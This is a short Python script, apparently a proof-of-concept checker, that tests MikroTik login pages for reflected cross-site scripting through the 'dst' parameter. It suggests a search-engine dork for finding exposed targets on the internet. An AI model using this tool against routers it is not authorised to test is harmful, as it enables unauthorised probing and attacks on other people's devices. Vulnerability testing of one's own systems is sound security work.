import requests

def test_reflected_xss(target_ip, payload):
    url = f"http://{target_ip}/login?dst={payload}"
    try:
        response = requests.get(url, timeout=5)
        if payload in response.text:
            print(f"[!] Potential XSS detected: the payload is reflected in the response.")
        else:
            print("[*] The payload was NOT reflected in the response. XSS not detected by this test.")
    except Exception as e:
        print(f"[!] Error connecting to {target_ip}: {e}")

if __name__ == "__main__":
    print("You can find your target with this dork: inurl:/login?dst=\n")
    target = input("Enter the target MikroTik IP address: ").strip()
    payload = input("Enter the payload for the 'dst' parameter (e.g., javascript:alert(3)): ").strip()
    test_reflected_xss(target, payload)
